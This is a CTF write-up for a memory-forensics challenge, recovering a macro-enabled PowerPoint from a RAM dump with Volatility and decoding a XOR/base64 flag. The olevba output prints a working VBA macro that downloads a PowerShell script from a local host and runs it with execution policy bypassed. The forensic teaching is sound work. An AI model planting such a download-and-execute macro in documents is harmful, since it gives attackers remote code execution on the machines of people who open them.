## MemHunt 2

We have a dump of a RAM and we have to find what has happened. 
This challenge can be solved both using volatility 2 and volatility 3

### Solution
In the description we know that the template has been downloaded from the University website and something happened when started writing. This seems a typical macro behavior. If you download a PowerPoint document, Windows Defender does not allow you to modify it unless you trust it and make it editable. If the document contains a macro (executable VBA code hidden in Microsoft documents such as Word, Excel, PowerPoint...), it can be executed.

If we use volatility plugin "filescan" grepping ppt, we can find a PowerPoint file with macros as it has the "pptm" extenstion.

Volatility 2 output
```
python2 vol.py -f memdump.mem --profile=Win10x64_19041 filescan | grep "ppt"      
Volatility Foundation Volatility Framework 2.6.1
0x0000bf080664baa0     17      0 R--rwd \Device\HarddiskVolume2\Users\User\Documents\presentazioneProgetto.pptm
0x0000bf080d8e54d0     10      0 R--r-d \Device\HarddiskVolume2\Program Files (x86)\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-0000-0000000FF1CE}\pptico.exe
```

Volatility 3 output
```
python3 vol.py -f memdump.mem windows.filescan.FileScan | grep "ppt" 
0xbf080664baa0.0\Users\User\Documents\presentazioneProgetto.pptm        216
0xbf08066712a0  \Users\User\Documents\presentazioneProgetto.pptm        216
0xbf080c79a3b0  \Windows\System32\drivers\raspptp.sys   216
0xbf080d8e54d0  \Program Files (x86)\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-0000-0000000FF1CE}\pptico.exe   216
```
As usual we have different results from volatility2 and volatility3 but the file we need is "presentazioneProgetto.pptm".

We can dump the file using "dumpfile" plugin:

Volatility 2 command to dump the file
```
python2 vol.py -f memdump.mem --profile=Win10x64_19041 dumpfiles -Q 0x0000bf080664baa0 -D .
```
We have no output from the previous command because the file is in virtual space memory, so we can use volatility 3

Volatility 3 command to dump the file: we had 2 addresses and we can use both
```
python3 vol.py -f memdump.mem windows.dumpfiles.DumpFiles --virtaddr 0xbf080664baa0
python3 vol.py -f memdump.mem windows.dumpfiles.DumpFiles --virtaddr 0xbf08066712a0
```

We have a .vacb file (should contain cached information) and .dat file (should contain all data).

We can use "unzip" tool to extract data from the PowerPoint file (can only be applied to .dat file).

We have an xml file and 3 directories: _rels, docProps, ppt. In docProps we have a thumbnail.jpeg image which contains the flag of the first level (could also be solved in this way).

As the file contains macro, we can use the tool olevba from oletools to get the macro and decrypt/decode them.

Here is the olevba output:
```
olevba file.0xbf080664baa0.0xbf080a699330.DataSectionObject.presentazioneProgetto.pptm.dat 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.11.5 - http://decalage.info/python/oletools
===============================================================================
FILE: file.0xbf080664baa0.0xbf080a699330.DataSectionObject.presentazioneProgetto.pptm.dat
Type: OpenXML
WARNING  invalid value for PROJECTLCID_Id expected 0002 got 004A
WARNING  invalid value for PROJECTLCID_Lcid expected 0409 got 0004
WARNING  invalid value for PROJECTLCIDINVOKE_Id expected 0014 got 0002
WARNING  invalid value for PROJECTCODEPAGE_Id expected 0003 got 0014
WARNING  invalid value for PROJECTCODEPAGE_Size expected 0002 got 0004
WARNING  invalid value for PROJECTNAME_Id expected 0004 got 0000
ERROR    PROJECTNAME_SizeOfProjectName value not in range [1-128]: 131075
ERROR    Error in _extract_vba
Traceback (most recent call last):
  File "/usr/local/lib/python3.11/dist-packages/oletools/olevba.py", line 3526, in extract_macros
    for stream_path, vba_filename, vba_code in \
  File "/usr/local/lib/python3.11/dist-packages/oletools/olevba.py", line 2094, in _extract_vba
    project = VBA_Project(ole, vba_root, project_path, dir_path, relaxed)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/oletools/olevba.py", line 1752, in __init__
    projectdocstring_id = struct.unpack("<H", dir_stream.read(2))[0]
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
struct.error: unpack requires a buffer of 2 bytes
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Modulo1 
in file: ppt/vbaProject.bin - OLE stream: 'Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Greet(Optional name As String = "srdnlen")
    MsgBox "Welcome to " & name & "CTF!", vbInformation, "Greeting"
End Sub

Sub Main()
    Call Greet
End Sub

-------------------------------------------------------------------------------
VBA MACRO Modulo2 
in file: ppt/vbaProject.bin - OLE stream: 'Modulo2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub EncryptFlag()
    Dim flag As String
    Dim key As String
    Dim encryptedFlag As String
    Dim decryptedFlag As String
    
    flag = "srdnlen{ahahahah_nope_fakeFL4G_XD:D0N0TSUBM1T}"
    key = ""
    encryptedFlag = XorEncrypt(flag, key)
    decryptedFlag = XorDecrypt(encryptedFlag, key)
    
    If decryptedFlag = flag Then
        Debug.Print "WOOOOOW MACRO WORKS!!!!!"
    Else
        Debug.Print "powershpointell"
    End If
End Sub

Function XorEncrypt(plaintext As String, key As String) As String
    Dim encrypted As String
    Dim i As Integer
    encrypted = ""
    
    For i = 1 To Len(plaintext)
        ' XOR each character in the plaintext with the corresponding character in the key
        encrypted = encrypted & ChrW(AscW(Mid(plaintext, i, 1)) Xor AscW(Mid(key, (i - 1) Mod Len(key) + 1, 1))
    Next i
    
    XorEncrypt = encrypted
End Function

Function XorDecrypt(ciphertext As String, key As String) As String
    XorDecrypt = XorEncrypt(ciphertext, key) ' XOR encryption and decryption are the same operation
End Function

Sub ExampleUsage()
    Dim plaintext As String
    Dim key As String
    Dim encrypted_text As String
    Dim decrypted_text As String
    
    plaintext = "Hello, XOR Encryption!"
    key = "secret"
    
    ' Encrypt the plaintext
    encrypted_text = XorEncrypt(plaintext, key)
    Debug.Print "Encrypted: " & encrypted_text
    
    ' Decrypt the ciphertext
    decrypted_text = XorDecrypt(encrypted_text, key)
    Debug.Print "Decrypted: " & decrypted_text
End Sub

Sub EncryptFlagExample()
    Dim input As String
    input = "c3JkbmxlbntDbFVXTFFGSEVna1hMUkpGQncwOFAxRTNJVlV9="
    
    ' Decrypt the input
    Dim decryptedFlag As String
    decryptedFlag = XorDecrypt(input, "")
    Debug.Print "Decrypted Flag: " & decryptedFlag
End Sub
-------------------------------------------------------------------------------
VBA MACRO Modulo3 
in file: ppt/vbaProject.bin - OLE stream: 'Modulo3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 And Win64 Then
    Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long) As Long

    Declare PtrSafe Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
        ByVal hwnd As LongPtr, _
        ByVal lpOperation As String, _
        ByVal lpFile As String, _
        ByVal lpParameters As String, _
        ByVal lpDirectory As String, _
        ByVal nShowCmd As Long) As Long
#Else
    Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long) As Long

    Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
        ByVal hwnd As Long, _
        ByVal lpOperation As String, _
        ByVal lpFile As String, _
        ByVal lpParameters As String, _
        ByVal lpDirectory As String, _
        ByVal nShowCmd As Long) As Long
#End If

Sub DownloadAndExecuteScript()
    Dim url As String
    Dim localFilePath As String
    Dim result As Long

    ' URL of the PowerShell script you want to download
    url = "http://192.168.56.1:555/myscript.ps1"

    ' Local file path where you want to save the downloaded script
    localFilePath = "C:\Users\User\AppData\Local\Temp\myscript.ps1"
    ' Download the script
    result = URLDownloadToFile(0, url, localFilePath, 0, 0)

    Do
        ' Check the result
        If result = 0 Then
            Debug.Print "PowerShell script downloaded successfully."
            
            ' Execute the downloaded script (you may adjust the execution parameters)
            result = ShellExecute(0, "open", "powershell.exe", "-ExecutionPolicy Bypass -File """ & localFilePath & """", vbNullString, vbNormalFocus)
    
            If result > 32 Then
                Debug.Print "PowerShell script executed successfully."
            Else
                Debug.Print "Failed to execute the PowerShell script. Error code: " & result
            End If
        Else
            Debug.Print "Failed to download the PowerShell script. Error code: " & result
        End If
    Loop While True

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|open                |May open a file                              |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|PowerShell          |May run PowerShell commands                  |
|Suspicious|ExecutionPolicy     |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|XOR                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://192.168.56.1:|URL                                          |
|          |555/myscript.ps1    |                                             |
|IOC       |192.168.56.1        |IPv4 address                                 |
|IOC       |shell32.dll         |Executable file name                         |
|IOC       |myscript.ps1        |Executable file name                         |
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

```

By analysing it we find that there is a macro simply printing welcome to srdnlen CTF (Modulo 1), a macro making xor encryptions and decryptions (Modulo 2) and a macro downloading and running a script (Modulo 3).

The encryption (Modulo 2) has a false flag saying to not submit it: _srdnlen{ahahahah_nope_fakeFL4G_XD:D0N0TSUBM1T}_

We have to call XorDecrypt function with the given input. The content of variable input = "c3JkbmxlbntDbFVXTFFGSEVna1hMUkpGQncwOFAxRTNJVlV9=". First we decode the base64: _srdnlen{ClUWLQFHEgkXLRJFBw08P1E3IVU}_. 

The description says the flag is something meaningful sentence wrapped in srdnlen{} format. The content of the previous decoded base64 string seems another base64 but it gives some meaningless bytes. They seem from an encryption and by reading the code, it could be that the University encoded those bytes with xor encryption using the given key "secret".

In fact, by applying xor decryption to the base64 decoding of the content of decoded input variable and using string "secret" as key, we have: _y0u_d3alt_w1th_M4CR0_

Hence, the flag of the second level is: **_srdnlen{y0u_d3alt_w1th_M4CR0}_**

